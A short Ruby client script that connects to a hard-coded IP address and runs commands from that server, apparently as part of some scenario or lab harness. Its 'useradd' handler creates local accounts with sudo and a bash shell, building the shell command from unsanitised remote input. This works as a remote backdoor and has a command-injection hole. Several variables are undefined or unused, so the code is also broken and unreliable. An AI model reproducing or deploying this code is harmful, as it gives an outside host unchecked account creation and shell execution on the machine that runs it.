#!/usr/bin/env ruby -w
require "socket"
class Client
  def initialize(server, instanceID, userName, driverID, name)
    @server = server
    @scenarioID = scenarioID
    @instanceID = instanceID
    @directive = nil
    listen
    @directive.join
  end

  def listen
    @server.puts("#{@scenarioID} #{@instanceID} #{driverID} #{name}")
    @directive = Thread.new do
      while line = @server.gets.split
        command(line)
      end
    end
    @directive.join
  end

  def command(input)
    # input = line.split
    case input[0]
    when "useradd"
      create_user(input[1], input[2])
    when "puts"
      puts(input[1..-1])
    when "ping"
      # do nothing
    else
    end
  end

  def send_message(message)
    puts(message)
  end

  def create_user(us,pw)
    pwd = pw.crypt("$5$a1")
    result = system("sudo useradd -m -p '#{ pwd }' #{ us } -s /bin/bash")
    if result
            puts "#{ us } created!"
        else
            puts "#{ us } failed!"
    end
  end
end

socket = TCPSocket.new('52.3.76.163', 3100)
Client.new(socket, ARGV[0], ARGV[1], ARGV[2], ARGV[3])
# 52.3.76.163